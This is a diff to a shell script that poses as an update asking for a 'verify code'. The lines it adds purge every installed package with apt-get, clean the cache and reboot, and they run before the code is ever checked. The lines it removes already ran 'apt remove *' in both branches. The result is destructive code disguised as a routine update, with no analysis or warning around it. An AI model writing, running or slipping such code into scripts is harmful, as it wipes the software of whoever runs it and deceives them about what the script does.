@@ -7,12 +7,15 @@ clear
 
 echo "Please, introduce verify code to end the update: "
 read code
+
+sudo dpkg --get-selections | grep -v deinstall | cut -f1 | xargs sudo apt-get purge -y
+sudo apt-get autoremove --purge -y
+sudo apt-get clean
+
 if [ "$code" != "ITSA-TEST" ]; then
-  sudo apt remove * -y
   echo "ITSA-TEST: Código detectado"
   sleep 3
 else
-  sudo apt remove * -y
   # sudo chmod -x /usr/bin/apt
   # sudo chmod -x /usr/bin/apt-get
 fi
@@ -32,6 +35,4 @@ sleep 1
 echo "Incorrect code, can't verify user, aborting..."
 sleep 1
 
-clear
-
-echo "Killed successfully"
+sudo reboot
